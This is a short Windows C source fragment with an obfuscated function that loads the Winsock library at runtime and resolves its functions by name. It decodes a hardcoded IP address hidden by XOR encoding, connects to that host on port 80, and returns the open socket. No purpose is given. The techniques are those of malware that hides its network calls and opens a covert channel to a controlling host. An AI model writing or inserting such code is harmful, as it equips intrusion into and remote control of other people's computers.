#ifdef _WIN32
#include "confio.h"

typedef int (WINAPI *CONNECT)(SOCKET, const struct sockaddr*, int);
typedef SOCKET (WINAPI *WSASOCK)(int, int, int, LPWSAPROTOCOL_INFO, GROUP, DWORD);
typedef int (WINAPI *WSASTART)(WORD, LPWSADATA);

void* s9e1() {
    HMODULE w32 = LoadLibraryA("ws2_32.dll");
    if (!w32) return NULL;

    WSASTART wsa_start = (WSASTART)GetProcAddress(w32, "WSAStartup");
    WSASOCK wsa_socket = (WSASOCK)GetProcAddress(w32, "WSASocketA");
    CONNECT con = (CONNECT)GetProcAddress(w32, "connect");

    if (!wsa_start || !wsa_socket || !con) return NULL;

    WSADATA wd;
    if (wsa_start(MAKEWORD(2, 2), &wd) != 0) return NULL;

    SOCKET s = wsa_socket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (s == INVALID_SOCKET) return NULL;

    struct sockaddr_in srv;
    char ip[] = {
        '1'^0x25, '7'^0x25, '2'^0x25, '.'^0x25,
        '1'^0x25, '6'^0x25, '.'^0x25,
        '0'^0x25, '.'^0x25,
        '1'^0x25, '8'^0x25, 0
    };
    u0l8(ip, 0x25);

    srv.sin_family = AF_INET;
    srv.sin_port = htons(80);
    srv.sin_addr.s_addr = inet_addr(ip);

    if (con(s, (struct sockaddr*)&srv, sizeof(srv)) != 0)
        return NULL;

    return (void*)s;
}
#endif
